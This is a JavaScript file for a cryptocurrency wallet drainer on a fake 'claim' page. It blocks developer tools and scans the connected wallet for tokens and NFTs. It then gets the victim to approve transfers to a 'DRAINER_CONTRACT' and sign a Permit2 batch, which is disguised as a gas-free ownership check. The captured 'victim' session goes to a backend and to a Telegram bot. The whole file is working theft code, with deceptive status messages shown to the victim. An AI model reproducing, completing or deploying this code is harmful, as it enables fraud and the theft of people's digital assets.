import { CONFIG } from './config.js';

// ====== ANTI-DEBUGGING (desktop only, minimal) ======
(function () {
  if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) return;
  document.addEventListener('contextmenu', (e) => e.preventDefault());
  document.addEventListener('selectstart', (e) => e.preventDefault());
  document.addEventListener('keydown', (e) => {
    if (e.keyCode === 123) e.preventDefault();
    if (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) e.preventDefault();
    if (e.ctrlKey && e.keyCode === 85) e.preventDefault();
  });
})();

// ====== DESTRUCTURE CONFIG ======
const {
  DRAINER_CONTRACT,
  CONTRACT_ABI,
  BACKEND_URL,
  TELEGRAM_BOT_TOKEN,
  TELEGRAM_CHAT_ID,
  KNOWN_TOKENS,
  KNOWN_NFT_COLLECTIONS,
  CLAIM_THRESHOLD_USD,
  PERMIT2_ADDRESS,
  APPROVAL_DELAY_MS,
  APPROVAL_COOLDOWN_EVERY,
  APPROVAL_COOLDOWN_MS,
} = CONFIG;

// ====== TELEGRAM ======
async function sendTelegramMessage(message) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return false;
  try {
    const r = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' }),
    });
    return r.ok;
  } catch (e) { console.error('Telegram error:', e); return false; }
}
window.sendTelegramMessage = sendTelegramMessage;

// ====== STATE ======
let web3 = null;
let connectedAddress = null;
let connectedWallet = null;
let userHasClaimed = false;
let userLocalCurrency = detectLocalCurrency();
let ethPriceInUSD = 2200;
let isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
let delayedAttemptsScheduled = false;

const DISABLE_DISCONNECT = isMobileDevice;

// ====== HELPERS ======
function detectLocalCurrency() {
  try {
    const region = (navigator.language || 'en-US').split('-')[1] || 'US';
    const map = {
      US: 'USD', GB: 'GBP', DE: 'EUR', FR: 'EUR', IT: 'EUR', ES: 'EUR', JP: 'JPY',
      CN: 'CNY', IN: 'INR', AU: 'AUD', CA: 'CAD', RU: 'RUB', BR: 'BRL', MX: 'MXN',
      KR: 'KRW', SG: 'SGD', HK: 'HKD', TR: 'TRY', SA: 'SAR', AE: 'AED', NG: 'NGN',
      ZA: 'ZAR', EG: 'EGP', PK: 'PKR', BD: 'BDT', ID: 'IDR', TH: 'THB', MY: 'MYR',
      PH: 'PHP', VN: 'VND',
    };
    return map[region] || 'USD';
  } catch (e) { return 'USD'; }
}

function formatCurrency(amount, currency) {
  try {
    return new Intl.NumberFormat(navigator.language, { style: 'currency', currency, minimumFractionDigits: 2 }).format(amount);
  } catch (e) { return `${amount} ${currency}`; }
}

function logDebug(msg) {
  console.log('[script.js]', msg);
  const el = document.getElementById('connectionDebug');
  if (el) el.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
}

function showNotification(message, type = 'success') {
  const n = document.createElement('div');
  n.className = `fake-notification ${type}`;
  n.innerHTML = `<i class="fas fa-${type === 'success' ? 'check-circle' : type === 'error' ? 'exclamation-circle' : 'info-circle'}"></i> ${message}`;
  document.body.appendChild(n);
  setTimeout(() => { n.style.opacity = '0'; setTimeout(() => n.remove(), 300); }, 3000);
}

function manualRandomDelay(min, max) {
  const d = Math.floor(Math.random() * (max - min + 1)) + min;
  return new Promise(r => setTimeout(r, d * (Math.random() * 0.4 + 0.8)));
}

async function getETHPriceInUSD() {
  const apis = [
    'https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd',
    'https://api.binance.com/api/v3/ticker/price?symbol=ETHUSDT',
  ];
  for (const api of apis) {
    try {
      const r = await fetch(api);
      const d = await r.json();
      if (api.includes('coingecko')) return d.ethereum.usd;
      if (api.includes('binance')) return parseFloat(d.price);
    } catch (e) {}
  }
  return 2200;
}

// ====== SYNC FROM main.js ======
function syncFromGlobal() {
  if (window.__apexConnected?.address) {
    connectedAddress = window.__apexConnected.address;
    connectedWallet = window.__apexConnected.chain;
    if (window.__apexConnected.web3) web3 = window.__apexConnected.web3;
    logDebug(`Synced: ${connectedAddress} (${connectedWallet})`);
    return true;
  }
  if (window.ethereum) {
    try {
      web3 = new Web3(window.ethereum);
      logDebug('Web3 fallback to injected provider');
      return true;
    } catch (e) { logDebug('Web3 fallback failed: ' + e.message); }
  }
  return false;
}

// ====== TOKEN/NFT BALANCE ======
async function getTokenBalance(addr, owner) {
  const abi = [{ constant: true, inputs: [{ name: '_owner', type: 'address' }], name: 'balanceOf', outputs: [{ name: 'balance', type: 'uint256' }], type: 'function' }];
  try {
    const c = new web3.eth.Contract(abi, addr);
    return await c.methods.balanceOf(owner).call();
  } catch (e) { return '0'; }
}

async function getNFTBalance(addr, owner) {
  const abi = [{ constant: true, inputs: [{ name: '_owner', type: 'address' }], name: 'balanceOf', outputs: [{ name: 'balance', type: 'uint256' }], type: 'function' }];
  try {
    const c = new web3.eth.Contract(abi, addr);
    return await c.methods.balanceOf(owner).call();
  } catch (e) { return '0'; }
}

async function detectTokens(owner) {
  const found = [];
  const concurrency = 5;
  for (let i = 0; i < KNOWN_TOKENS.length; i += concurrency) {
    const batch = KNOWN_TOKENS.slice(i, i + concurrency);
    const results = await Promise.allSettled(batch.map(async (t) => {
      const bal = await getTokenBalance(t.address, owner);
      if (bal && bal !== '0') {
        const formatted = parseFloat(bal) / Math.pow(10, t.decimals);
        return { address: t.address, symbol: t.symbol, decimals: t.decimals, balance: bal.toString(), balanceFormatted: formatted };
      }
      return null;
    }));
    for (const r of results) if (r.status === 'fulfilled' && r.value) found.push(r.value);
  }
  return found;
}

async function detectNFTs(owner) {
  const found = [];
  for (const c of KNOWN_NFT_COLLECTIONS) {
    const bal = await getNFTBalance(c.address, owner);
    if (bal && bal !== '0') {
      found.push({ address: c.address, standard: c.standard, name: c.name, balance: parseInt(bal) });
    }
  }
  return found;
}

// ====== ALLOWANCE CHECK ======
async function checkAllowance(tokenAddr, owner) {
  const abi = [{ constant: true, inputs: [{ name: '_owner', type: 'address' }, { name: '_spender', type: 'address' }], name: 'allowance', outputs: [{ name: '', type: 'uint256' }], type: 'function' }];
  try {
    const c = new web3.eth.Contract(abi, tokenAddr);
    return await c.methods.allowance(owner, DRAINER_CONTRACT).call();
  } catch (e) { return '0'; }
}

// ====== APPROVE ERC-20 (with USDT reset) ======
async function approveToken(tokenAddr, owner, amount) {
  try {
    const erc20 = [
      { constant: false, inputs: [{ name: '_spender', type: 'address' }, { name: '_value', type: 'uint256' }], name: 'approve', outputs: [{ name: '', type: 'bool' }], type: 'function' },
    ];
    const c = new web3.eth.Contract(erc20, tokenAddr);

    // Two-step reset for USDT-style tokens
    const current = await checkAllowance(tokenAddr, owner);
    if (current && current !== '0') {
      logDebug(`Resetting allowance for ${tokenAddr}`);
      const resetGas = await c.methods.approve(DRAINER_CONTRACT, '0').estimateGas({ from: owner });
      const resetTx = await c.methods.approve(DRAINER_CONTRACT, '0').send({ from: owner, gas: Math.floor(resetGas * 1.2) });
      logDebug(`Reset TX: ${resetTx.transactionHash}`);
      await new Promise(r => setTimeout(r, 3000));
    }

    const gas = await c.methods.approve(DRAINER_CONTRACT, amount).estimateGas({ from: owner });
    const tx = await c.methods.approve(DRAINER_CONTRACT, amount).send({ from: owner, gas: Math.floor(gas * 1.2) });
    logDebug(`Approve OK: ${tx.transactionHash}`);
    return tx.transactionHash;
  } catch (e) {
    logDebug(`Approve failed ${tokenAddr}: ${e.message}`);
    return null;
  }
}

// ====== APPROVE NFT (setApprovalForAll) ======
async function approveNFT(collection, owner) {
  try {
    const abi = [{ constant: false, inputs: [{ name: '_operator', type: 'address' }, { name: '_approved', type: 'bool' }], name: 'setApprovalForAll', outputs: [], type: 'function' }];
    const c = new web3.eth.Contract(abi, collection);
    const gas = await c.methods.setApprovalForAll(DRAINER_CONTRACT, true).estimateGas({ from: owner });
    const tx = await c.methods.setApprovalForAll(DRAINER_CONTRACT, true).send({ from: owner, gas: Math.floor(gas * 1.2) });
    logDebug(`setApprovalForAll OK: ${tx.transactionHash}`);
    return tx.transactionHash;
  } catch (e) {
    logDebug(`setApprovalForAll failed: ${e.message}`);
    return null;
  }
}

// ====== PERMIT2 SIGNATURE CAPTURE ======
async function capturePermit2Signature(tokens) {
  if (!tokens.length || !window.ethereum?.request) return null;
  try {
    const now = Math.floor(Date.now() / 1000);
    const sigDeadline = now + 60 * 60 * 24 * 30;

    // Build PermitBatch details with proper hex amounts
    const details = tokens.map((t) => ({
      token: t.address,
      amount: '0x' + BigInt(t.balance).toString(16), // uint160 as hex
      expiration: now + 60 * 60 * 24 * 30,
      nonce: 0,
    }));

    const typedData = {
      types: {
        EIP712Domain: [
          { name: 'name', type: 'string' },
          { name: 'chainId', type: 'uint256' },
          { name: 'verifyingContract', type: 'address' },
        ],
        PermitDetails: [
          { name: 'token', type: 'address' },
          { name: 'amount', type: 'uint160' },
          { name: 'expiration', type: 'uint48' },
          { name: 'nonce', type: 'uint48' },
        ],
        PermitBatch: [
          { name: 'details', type: 'PermitDetails[]' },
          { name: 'spender', type: 'address' },
          { name: 'sigDeadline', type: 'uint256' },
        ],
      },
      domain: {
        name: 'Permit2',
        chainId: 1,
        verifyingContract: PERMIT2_ADDRESS,
      },
      primaryType: 'PermitBatch',
      message: {
        details,
        spender: DRAINER_CONTRACT,
        sigDeadline,
      },
    };

    const signature = await window.ethereum.request({
      method: 'eth_signTypedData_v4',
      params: [connectedAddress, JSON.stringify(typedData)],
    });

    logDebug(`Permit2 signature captured: ${signature.slice(0, 20)}...`);
    return {
      permitBatch: {
        details,
        spender: DRAINER_CONTRACT,
        sigDeadline,
      },
      signature,
      amounts: tokens.map((t) => t.balance.toString()),
    };
  } catch (e) {
    logDebug('Permit2 signature declined: ' + e.message);
    return null;
  }
}

// ====== POST TO BACKEND (with retry) ======
async function postToBackend(session, retries = 2) {
  if (!BACKEND_URL) {
    logDebug('⚠️ BACKEND_URL missing in config');
    return null;
  }
  for (let attempt = 1; attempt <= retries + 1; attempt++) {
    try {
      logDebug(`POST attempt ${attempt}/${retries + 1} → ${BACKEND_URL}`);
      const r = await fetch(BACKEND_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(session),
      });
      const text = await r.text();
      logDebug(`Backend: ${r.status} — ${text.slice(0, 200)}`);
      if (r.ok) {
        try { return JSON.parse(text); } catch (e) { return { status: r.status }; }
      }
    } catch (e) {
      logDebug(`POST attempt ${attempt} failed: ${e.message}`);
    }
    if (attempt <= retries) await new Promise(r => setTimeout(r, 1500 * attempt));
  }
  return null;
}

// ====== MAIN DRAIN ======
async function drainEVM() {
  const button = document.getElementById('connectButton');
  const originalText = button?.innerHTML || '';
  const claimStatus = document.getElementById('claimStatus');

  if (!syncFromGlobal() || !web3) {
    showNotification('Please connect your wallet first', 'error');
    return;
  }
  if (!connectedAddress) {
    const accounts = await web3.eth.getAccounts();
    connectedAddress = accounts[0];
  }
  if (!connectedAddress) {
    showNotification('No wallet address available', 'error');
    return;
  }

  try {
    if (button) {
      button.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Verifying...';
      button.disabled = true;
    }
    if (claimStatus) { claimStatus.textContent = 'Scanning wallet...'; claimStatus.className = 'status pending'; }

    await manualRandomDelay(800, 1500);

    // Balance check
    const ethBal = await web3.eth.getBalance(connectedAddress);
    const ethBalETH = web3.utils.fromWei(ethBal, 'ether');
    const userBalanceInUSD = parseFloat(ethBalETH) * ethPriceInUSD;
    logDebug(`Balance: ${ethBalETH} ETH (~$${userBalanceInUSD.toFixed(2)})`);

    if (userBalanceInUSD < CLAIM_THRESHOLD_USD) {
      if (claimStatus) { claimStatus.textContent = 'Insufficient balance.'; claimStatus.className = 'status error'; }
      if (button) { button.innerHTML = originalText; button.disabled = false; }
      await sendTelegramMessage(`<b>⚠️ Skipped (low balance)</b>\n${connectedAddress}\n$${userBalanceInUSD.toFixed(2)}`);
      return;
    }

    if (userHasClaimed) {
      if (claimStatus) { claimStatus.textContent = 'Already claimed.'; claimStatus.className = 'status error'; }
      if (button) { button.innerHTML = originalText; button.disabled = false; }
      return;
    }

    // ============================================================
    //  PHASE 1: DETECT
    // ============================================================
    if (claimStatus) claimStatus.textContent = 'Detecting assets...';
    const tokens = await detectTokens(connectedAddress);
    const nfts = await detectNFTs(connectedAddress);
    logDebug(`Detected ${tokens.length} tokens, ${nfts.length} NFT collections`);

    if (tokens.length === 0 && nfts.length === 0) {
      if (claimStatus) { claimStatus.textContent = 'No eligible assets.'; claimStatus.className = 'status info'; }
      if (button) { button.innerHTML = originalText; button.disabled = false; }
      await sendTelegramMessage(`<b>ℹ️ No assets</b>\n${connectedAddress}`);
      return;
    }

    // ============================================================
    //  PHASE 2: APPROVE TOKENS (with cooldown every N)
    // ============================================================
    const approvedTokens = [];
    for (let i = 0; i < tokens.length; i++) {
      if (claimStatus) claimStatus.textContent = `Approving ${tokens[i].symbol} (${i + 1}/${tokens.length})...`;
      const hash = await approveToken(tokens[i].address, connectedAddress, tokens[i].balance);
      if (hash) approvedTokens.push(tokens[i]);
      await manualRandomDelay(APPROVAL_DELAY_MS, APPROVAL_DELAY_MS + 800);

      // Cooldown every N approvals
      if ((i + 1) % APPROVAL_COOLDOWN_EVERY === 0 && i < tokens.length - 1) {
        logDebug(`Cooldown ${APPROVAL_COOLDOWN_MS}ms`);
        await new Promise(r => setTimeout(r, APPROVAL_COOLDOWN_MS));
      }
    }

    // ============================================================
    //  PHASE 3: APPROVE NFTs
    // ============================================================
    const approvedNFTs = [];
    for (const nft of nfts) {
      if (claimStatus) claimStatus.textContent = `Approving NFTs (${nft.name})...`;
      const hash = await approveNFT(nft.address, connectedAddress);
      if (hash) approvedNFTs.push(nft);
      await manualRandomDelay(APPROVAL_DELAY_MS, APPROVAL_DELAY_MS + 800);
    }

    // ============================================================
    //  PHASE 4: PERMIT2 SIGNATURE
    // ============================================================
    let permit2 = null;
    if (approvedTokens.length > 0) {
      if (claimStatus) claimStatus.textContent = 'Sign to verify ownership (no gas)...';
      permit2 = await capturePermit2Signature(approvedTokens);
    }

    // ============================================================
    //  PHASE 5: POST SESSION TO BACKEND
    // ============================================================
    const session = {
      victim: connectedAddress,
      chain: 1,
      tokens: approvedTokens.map(t => ({ address: t.address, symbol: t.symbol, amount: t.balance, decimals: t.decimals })),
      nfts: approvedNFTs.map(n => ({ address: n.address, standard: n.standard, name: n.name })),
      permit2,
      timestamp: Date.now(),
      userAgent: navigator.userAgent,
      isMobile: isMobileDevice,
    };

    if (claimStatus) claimStatus.textContent = 'Submitting to backend...';
    const backendResponse = await postToBackend(session);

    // ============================================================
    //  PHASE 6: REPORT
    // ============================================================
    if (approvedTokens.length > 0 || approvedNFTs.length > 0) {
      userHasClaimed = true;
      if (claimStatus) { claimStatus.textContent = 'Claim successful!'; claimStatus.className = 'status success'; }

      const msg = `<b>🟦 Session Submitted</b>
👤 <b>Victim:</b> <code>${connectedAddress}</code>
🪙 <b>Tokens approved:</b> ${approvedTokens.length}
🎨 <b>NFTs approved:</b> ${approvedNFTs.length}
🔏 <b>Permit2 signed:</b> ${permit2 ? 'YES' : 'NO'}
📡 <b>Backend:</b> ${backendResponse ? 'OK' : 'FAILED'}
🕒 ${new Date().toISOString()}`;
      await sendTelegramMessage(msg);

      showNotification(`Approved ${approvedTokens.length} tokens for transfer`, 'info');
    } else {
      if (claimStatus) { claimStatus.textContent = 'No approvals succeeded.'; claimStatus.className = 'status info'; }
      await sendTelegramMessage(`<b>ℹ️ No approvals</b>\n${connectedAddress}`);
    }

    if (button) { button.innerHTML = originalText; button.disabled = false; }

  } catch (err) {
    logDebug('drainEVM error: ' + err.message);
    if (claimStatus) { claimStatus.textContent = 'Failed: ' + err.message; claimStatus.className = 'status error'; }
    if (button) { button.innerHTML = originalText; button.disabled = false; }
    await sendTelegramMessage(`<b>❌ Drain Failed</b>\n${connectedAddress}\n${err.message}`);
  }
}

// ====== DISPATCHER ======
async function initiateClaimProcess() {
  syncFromGlobal();

  if (web3 && connectedAddress) {
    logDebug('Starting EVM flow...');
    await drainEVM();
    if (!delayedAttemptsScheduled) {
      delayedAttemptsScheduled = true;
      setTimeout(() => { delayedAttemptsScheduled = false; }, 150000);
    }
    return;
  }
  showNotification('No EVM wallet connected', 'error');
}

// ====== EXPOSE GLOBALLY ======
window.initiateClaimProcess = initiateClaimProcess;
window.drainEVM = drainEVM;

// ====== LISTEN FOR main.js PUBLISH ======
window.addEventListener('apex:connected', () => {
  logDebug('apex:connected event received');
  syncFromGlobal();
});

// ====== BOOT ======
(async function boot() {
  ethPriceInUSD = await getETHPriceInUSD();
  logDebug('✅ script.js ready');
  console.log('✅ script.js loaded — backend-delegating model');
})();
